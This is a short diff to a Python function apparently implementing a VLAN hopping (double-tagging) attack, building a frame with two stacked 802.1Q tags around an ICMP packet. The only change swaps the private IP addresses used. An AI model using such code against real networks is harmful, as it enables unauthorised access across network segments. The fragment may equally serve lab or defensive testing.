@@ -6,7 +6,7 @@ def vlan_hopping(interface, native_vlan, target_vlan):
         Ether(src="00:11:22:33:44:55", dst="01:80:c2:00:00:00") /
         Dot1Q(vlan=native_vlan) /
         Dot1Q(vlan=target_vlan) /
-        IP(src="192.168.1.1", dst="192.168.1.2") /
+        IP(src="172.16.1.59", dst="172.16.1.60") /
         ICMP()
     )
 
